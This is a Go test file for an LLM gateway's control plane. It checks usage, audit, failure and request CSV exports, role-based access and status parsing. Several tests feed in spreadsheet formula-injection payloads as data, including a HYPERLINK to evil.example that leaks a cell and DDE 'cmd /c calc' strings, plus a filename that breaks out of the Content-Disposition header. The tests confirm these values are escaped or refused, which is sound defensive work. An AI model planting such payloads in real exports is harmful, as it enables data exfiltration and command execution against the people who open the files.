package control

import (
	"encoding/csv"
	"encoding/json"
	"log/slog"
	"mime"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/bespinian/keera-gateway/internal/authn"
	"github.com/bespinian/keera-gateway/internal/httpx"
	"github.com/bespinian/keera-gateway/internal/store"
)

// A usage report grouped by key or by user used to render raw ids, which are
// exactly the two groupings a manager asks for and exactly the two nobody can
// read. Everything resolves to a name, and an id with no row behind it says so
// rather than being shown bare.
func TestGroupLabelsResolveEveryGrouping(t *testing.T) {
	g := groupLabels{
		teams: map[string]string{"team_1": "Payments Platform"},
		keys:  map[string]string{"key_1": "a developer's laptop"},
		users: map[string]string{"user_1": "first.last@example.ch"},
	}
	tests := []struct{ groupBy, id, want string }{
		{"team", "team_1", "Payments Platform"},
		{"key", "key_1", "a developer's laptop"},
		{"user", "user_1", "first.last@example.ch"},
		{"model", "keera-code", "keera-code"},
		{"day", "2026-09-06", "2026-09-06"},
		// A key whose organisation was purged: the usage row outlives it.
		{"key", "key_gone", "key_gone"},
		// Real traffic with no team: a key issued organisation-wide.
		{"team", "", "(none)"},
	}
	for _, tc := range tests {
		if got := g.label(tc.groupBy, tc.id); got != tc.want {
			t.Errorf("label(%q, %q) = %q, want %q", tc.groupBy, tc.id, got, tc.want)
		}
	}
}

// A chargeback is reconciled in a spreadsheet, so the export has to carry the
// name, the id it resolves and the money - not the pretty-printed money the
// panel shows.
func TestUsageCSVCarriesNamesIdsAndCost(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{Currency: "CHF"}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	from := time.Date(2026, 8, 1, 0, 0, 0, 0, time.UTC)
	to := time.Date(2026, 9, 1, 0, 0, 0, 0, time.UTC)

	s.usageCSV(w, "org_1", "team", from, to, []store.UsageBucket{
		{Group: "team_1", Requests: 12, InputTokens: 900, OutputTokens: 100, CostMicros: 2_500_000},
		{Group: "", Requests: 1, CostMicros: 0},
	}, groupLabels{teams: map[string]string{"team_1": "Payments Platform"}})

	if ct := w.Header().Get("Content-Type"); !strings.HasPrefix(ct, "text/csv") {
		t.Errorf("Content-Type = %q, want text/csv", ct)
	}
	if cd := w.Header().Get("Content-Disposition"); !strings.Contains(cd, "attachment") {
		t.Errorf("Content-Disposition = %q; a report has to arrive as a file", cd)
	}

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 3 {
		t.Fatalf("got %d rows, want a header and two", len(rows))
	}
	if rows[0][0] != "team" || rows[0][5] != "cost_chf" {
		t.Errorf("header = %v, want it named by the grouping and the currency", rows[0])
	}
	if rows[1][0] != "Payments Platform" || rows[1][1] != "team_1" {
		t.Errorf("row = %v, want both the name and the id it resolves", rows[1])
	}
	if rows[1][5] != "2.50" {
		t.Errorf("cost = %q, want 2.50", rows[1][5])
	}
	if rows[2][0] != "(none)" {
		t.Errorf("an ungrouped row = %q, want it named", rows[2][0])
	}
}

// The audit export is the artefact somebody hands to a compliance reader, so
// the detail has to survive it intact - a summarised audit trail is not one.
func TestUsageRefusesAnUnknownGrouping(t *testing.T) {
	// The store maps a grouping it does not know onto its default, so such a
	// request used to come back 200 - a report built on a grouping other than
	// the one asked for, with the caller's own string still reflected through
	// it and into the CSV export's filename. It is a 400 now.
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet, `/v1/usage?format=csv&group_by=x.bat%22%3Bx%3D%22`, nil)

	s.usage(w, r, &authn.Principal{Role: authn.RoleMember, OrgID: "org_1"})

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", w.Code)
	}
	if !strings.Contains(w.Body.String(), "group_by") {
		t.Errorf("body = %q, want it to name the parameter and the values it takes",
			w.Body.String())
	}
}

func TestBeginCSVFilenameCannotBeBrokenOutOf(t *testing.T) {
	// The usage export builds its filename from a caller-supplied grouping.
	// The handler now refuses an unknown one, and this is the second lock: a
	// filename carrying a quote must not be able to close the parameter and
	// add another of its own.
	w := httptest.NewRecorder()
	beginCSV(w, `x.bat";x="`)

	cd := w.Header().Get("Content-Disposition")
	if !strings.HasPrefix(cd, "attachment;") {
		t.Fatalf("Content-Disposition = %q; a report has to arrive as a file", cd)
	}
	_, params, err := mime.ParseMediaType(cd)
	if err != nil {
		t.Fatalf("Content-Disposition = %q does not parse: %v", cd, err)
	}
	if len(params) != 1 {
		t.Errorf("Content-Disposition = %q carries %d parameters, want only filename", cd, len(params))
	}
	if got := params["filename"]; got != `x.bat";x="` {
		t.Errorf("filename = %q, want the name given back whole and inert", got)
	}
}

func TestAuditCSVKeepsTheDetailIntact(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	ts := time.Date(2026, 9, 6, 14, 30, 0, 0, time.UTC)

	s.auditCSV(w, []store.AuditEntry{{
		ID: 7, TS: ts, Actor: "first.last@example.ch", Action: "guardrail.put",
		TargetType: "team", TargetID: "team_1",
		Detail: json.RawMessage(`{"rpm":120,"budget_micros":500000000}`),
	}})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want a header and one", len(rows))
	}
	if rows[1][0] != ts.Format(time.RFC3339) {
		t.Errorf("timestamp = %q, want RFC3339", rows[1][0])
	}
	if rows[1][1] != "first.last@example.ch" || rows[1][2] != "guardrail.put" {
		t.Errorf("row = %v", rows[1])
	}
	var detail map[string]any
	if err := json.Unmarshal([]byte(rows[1][5]), &detail); err != nil {
		t.Fatalf("the detail did not survive the export: %v", err)
	}
	if detail["rpm"] != float64(120) {
		t.Errorf("detail = %v, want the limits that were set", detail)
	}
}

// A check reaches the inference plane directly on the model's own credential.
// That is operator work, for the same reason the backend URLs are operator-only.
func TestCheckModelIsOperatorOnly(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, httpx.ControlPrefix+"/v1/models/keera-code/check", nil)

	s.checkModel(w, r, &authn.Principal{Role: authn.RoleAdmin, OrgID: "org_1"})

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", w.Code)
	}
	if !strings.Contains(w.Body.String(), "only an operator") {
		t.Errorf("body = %q, want it to say who may run one", w.Body.String())
	}
}

// A control plane running without an inference listener has nothing to check
// against, and should say so rather than panic on a nil gateway.
func TestCheckModelWithoutAGatewaySaysSo(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodPost, httpx.ControlPrefix+"/v1/models/keera-code/check", nil)

	s.checkModel(w, r, &authn.Principal{Role: authn.RoleOperator})

	if w.Code != http.StatusServiceUnavailable {
		t.Fatalf("status = %d, want 503", w.Code)
	}
}

// A name is written by whoever administers an organisation, and the export is
// opened by whoever administers the deployment. Nothing either of them typed
// may arrive as a formula.
func TestCSVExportsCannotCarryAFormula(t *testing.T) {
	tests := []struct{ name, field, want string }{
		{
			"a formula", `=HYPERLINK("http://evil.example/?"&A1,"invoice")`,
			`'=HYPERLINK("http://evil.example/?"&A1,"invoice")`,
		},
		{"the DDE form", `=cmd|' /c calc'!A1`, `'=cmd|' /c calc'!A1`},
		{"a lookup", "@SUM(A1:A9)", "'@SUM(A1:A9)"},
		{"a leading tab", "\tSUM", "'\tSUM"},
		{"a leading carriage return", "\r=SUM", "'\r=SUM"},
		{"a signed expression", "-1+cmd|' /c calc'!A1", "'-1+cmd|' /c calc'!A1"},
		{"a plain name", "Payments Platform", "Payments Platform"},
		{"an email address", "first.last@example.ch", "first.last@example.ch"},
		{"an empty field", "", ""},
		// The money and the token counts are read as numbers by the reader this
		// export exists for, so a sign that is arithmetic stays arithmetic.
		{"a negative amount", "-2.50", "-2.50"},
		{"a signed integer", "+12", "+12"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			if got := csvSafe(tc.field); got != tc.want {
				t.Errorf("csvSafe(%q) = %q, want %q", tc.field, got, tc.want)
			}
		})
	}
}

// The escape has to be applied by the writer both exports share, not remembered
// column by column.
func TestAuditCSVEscapesEveryFieldItIsGiven(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()

	s.auditCSV(w, []store.AuditEntry{{
		ID: 7, TS: time.Date(2026, 9, 6, 14, 30, 0, 0, time.UTC),
		Actor: `=1+1`, Action: "guardrail.put", TargetType: "team", TargetID: `@A1`,
		Detail: json.RawMessage(`{"system_prompt":"=1+1"}`),
	}})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want a header and one", len(rows))
	}
	if rows[1][1] != `'=1+1` || rows[1][4] != `'@A1` {
		t.Errorf("row = %q; every field goes through the escape, not just the ones "+
			"somebody remembered", rows[1])
	}
	// The detail is a JSON document, so it starts with a brace and is left
	// alone - a compliance reader has to be able to parse it back.
	if rows[1][5] != `{"system_prompt":"=1+1"}` {
		t.Errorf("detail = %q, want it intact", rows[1][5])
	}
}

// The failure log names other people's keys and carries error text written by
// the inference plane. A member reads their own failures on My access; this
// screen is for whoever runs the organisation.
func TestFailuresAreAdministratorOnly(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet, httpx.ControlPrefix+"/v1/failures", nil)

	s.failures(w, r, &authn.Principal{Role: authn.RoleMember, OrgID: "org_1"})

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", w.Code)
	}
	if !strings.Contains(w.Body.String(), "only an administrator") {
		t.Errorf("body = %q, want it to say who may read one", w.Body.String())
	}
}

// The export exists to be attached to the message that goes to whoever runs the
// endpoint that produced the failures, so it has to carry the wording they will
// recognise - and the names beside the ids, since a key id means nothing to
// anybody outside this deployment.
func TestFailuresCSVCarriesTheMessageAndTheNames(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	ts := time.Date(2026, 9, 6, 14, 30, 0, 0, time.UTC)

	s.failuresCSV(w, []store.Failure{{
		ID: 9, TS: ts, Alias: "keera-code", Status: 500,
		Error: "CUDA out of memory", KeyID: "key_1", TeamID: "team_1", UserID: "user_1",
		LatencyMS: 1200, Stream: true,
	}}, groupLabels{
		teams: map[string]string{"team_1": "Payments Platform"},
		keys:  map[string]string{"key_1": "a developer's laptop"},
		users: map[string]string{"user_1": "first.last@example.ch"},
	})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want a header and one", len(rows))
	}
	if rows[1][0] != ts.Format(time.RFC3339) || rows[1][1] != "keera-code" || rows[1][2] != "500" {
		t.Errorf("row = %v, want when, which model and which status", rows[1])
	}
	if rows[1][3] != "CUDA out of memory" {
		t.Errorf("message = %q; without it the row says only that something failed", rows[1][3])
	}
	if rows[1][4] != "a developer's laptop" || rows[1][5] != "key_1" {
		t.Errorf("row = %v, want both the key's name and the id it resolves", rows[1])
	}
	if rows[1][6] != "Payments Platform" || rows[1][7] != "first.last@example.ch" {
		t.Errorf("row = %v, want the team and the person it happened to", rows[1])
	}
}

// A backend is free to answer with whatever it likes, and the file is opened in
// a spreadsheet by whoever administers the deployment.
func TestFailuresCSVEscapesTheBackendsWording(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()

	s.failuresCSV(w, []store.Failure{{
		ID: 1, TS: time.Now(), Alias: "keera-code", Status: 500,
		Error: `=cmd|' /c calc'!A1`,
	}}, groupLabels{})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if rows[1][3] != `'=cmd|' /c calc'!A1` {
		t.Errorf("message = %q, want it escaped", rows[1][3])
	}
}

// The request log carries what the failure log carries and the served rows on
// top, which is strictly more of other people's traffic. It is gated the same
// way for the same reason.
func TestRequestsAreAdministratorOnly(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet, httpx.ControlPrefix+"/v1/requests?team_id=team_1", nil)

	s.requests(w, r, &authn.Principal{Role: authn.RoleMember, OrgID: "org_1"})

	if w.Code != http.StatusForbidden {
		t.Fatalf("status = %d, want 403", w.Code)
	}
	if !strings.Contains(w.Body.String(), "only an administrator") {
		t.Errorf("body = %q, want it to say who may read one", w.Body.String())
	}
}

// The entity screens send an id in a query parameter, so the id is the whole of
// what stands between one tenant's administrator and another tenant's numbers.
// An operator has no organisation to check against and reads every one.
func TestEntityScopeReadsTheIdsAsGiven(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet,
		"/v1/overview?team_id=team_1&key_id=key_1&alias=keera-code&user_id=user_1", nil)

	// An empty organisation is the operator looking across tenants: nothing to
	// check an id against, and every tenant theirs to read.
	sc, ok := s.entityScope(w, r, "")
	if !ok {
		t.Fatalf("an operator was refused: %d %s", w.Code, w.Body.String())
	}
	if sc.TeamID != "team_1" || sc.KeyID != "key_1" ||
		sc.Alias != "keera-code" || sc.UserID != "user_1" {
		t.Errorf("scope = %+v, want every narrowing carried through", sc)
	}
	if sc.Empty() {
		t.Error("a scope with four ids in it reports itself as empty")
	}
	if !(store.Scope{}).Empty() {
		t.Error("the zero scope has to be the dashboard's, which narrows nothing")
	}
}

// The export is read in a spreadsheet by whoever administers the deployment,
// and half of what is in it - the message, and the names an administrator chose
// - is written by somebody else.
func TestRequestsCSVCarriesTheNumbersAndEscapesTheWording(t *testing.T) {
	s := New(nil, nil, nil, nil, Options{Currency: "CHF"}, slog.New(slog.DiscardHandler))
	w := httptest.NewRecorder()
	ts := time.Date(2026, 9, 6, 14, 30, 0, 0, time.UTC)

	s.requestsCSV(w, []store.Request{{
		ID: 9, TS: ts, Alias: "keera-code", Status: 200,
		KeyID: "key_1", TeamID: "team_1", UserID: "user_1",
		InputTokens: 1000, OutputTokens: 200, CostMicros: 2_500_000,
		LatencyMS: 4000, TTFTMS: 300, Stream: true,
	}, {
		ID: 10, TS: ts, Alias: "keera-code", Status: 500,
		Error: `=cmd|' /c calc'!A1`,
	}}, groupLabels{
		teams: map[string]string{"team_1": "Payments Platform"},
		keys:  map[string]string{"key_1": "a developer's laptop"},
		users: map[string]string{"user_1": "first.last@example.ch"},
	})

	rows, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 3 {
		t.Fatalf("got %d rows, want a header and two", len(rows))
	}
	if rows[0][10] != "cost_chf" {
		t.Errorf("header = %v, want the cost column named by the currency", rows[0])
	}
	if rows[1][8] != "1000" || rows[1][9] != "200" || rows[1][10] != "2.50" {
		t.Errorf("row = %v, want the tokens and the cost that explain each other", rows[1])
	}
	if rows[1][12] != "300" {
		t.Errorf("ttft = %q; a model that has gone slow is only visible in it", rows[1][12])
	}
	if rows[2][3] != `'=cmd|' /c calc'!A1` {
		t.Errorf("message = %q, want it escaped", rows[2][3])
	}
}

// The log's status filter is asked in two sizes: one code, and a whole class of
// them. A reader wanting "everything that failed" does not know which of 500,
// 502 and 504 their own backends answer with, and should not have to.
func TestParseStatusReadsAClassAsWellAsACode(t *testing.T) {
	for _, tc := range []struct {
		in           string
		exact, class int
	}{
		{"", 0, 0},
		{"503", 503, 0},
		{"5xx", 0, 5},
		{"4XX", 0, 4},
		{"2xx", 0, 2},
		// Neither a code nor a class narrows nothing at all, rather than
		// narrowing to something the reader did not ask for.
		{"failed", 0, 0},
		{"9xx", 0, 0},
		{"xx", 0, 0},
	} {
		exact, class := parseStatus(tc.in)
		if exact != tc.exact || class != tc.class {
			t.Errorf("parseStatus(%q) = %d/%d, want %d/%d",
				tc.in, exact, class, tc.exact, tc.class)
		}
	}
}
